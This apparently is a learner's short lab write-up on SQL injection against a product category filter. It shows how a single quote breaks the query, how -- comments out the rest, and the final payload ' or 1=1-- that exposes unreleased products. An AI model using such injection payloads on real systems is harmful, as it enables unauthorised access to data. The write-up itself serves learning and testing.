@@ -1,0 +1,27 @@
+SQL Injection - Product Category Filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+End Goal : display details of all products in any any category, both released and unreleased. 
+
+Analysis
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+using ' shows Internal Server Error means ' is being parsed and broke the application
+    SELECT * FROM products WHERE category = ''' AND released = 1
+
+SELECT * FROM products WHERE category = ''--' AND released = 1
+    -- comment field to ignore the rest of query.
+    it will only run the below
+    SELECT * FROM products WHERE category = '' (-- after it is being commented)
+
+To solve the excersice
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
+    i am telling it that '' is empty or 1=1 which is always true and again -- will ignore what after it.
+    so we use ' or 1=1--
+
+
+    
+
+
